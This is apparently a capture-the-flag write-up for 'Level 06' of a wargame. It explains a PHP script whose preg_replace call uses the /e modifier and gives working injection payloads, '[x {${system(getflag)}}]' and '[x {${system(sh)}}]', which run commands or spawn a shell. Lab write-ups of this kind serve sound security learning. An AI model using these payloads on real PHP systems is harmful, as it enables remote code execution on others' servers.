Level 06 provide us an executable file and is soure code

We have two function

'y($m)' which will :
	- replace any '.' with ' x ' in $m argument
	- replace any '@' with ' y'  in $m argument

'x($y, $z)' which will :
	- get content of file $y
	- apply first regex : 
	    - search for a string like this : '[x (.*)]
		ex : '[x HelloWorld]
		     '[x Hello@World.com]'
	    - replace by : 
		ex : 'y(HelloWorld)
		     'y(Hello yWorld x com)



$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")"

This line is exploitable, the /e will execute the second agument as a php expression

after some try here is the exploit :

see : https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex
the command is executed before itâ€™s output is passed


vim /tmp/pass

[x {${system(getflag)}}]
or
[x {${system(sh)}}]
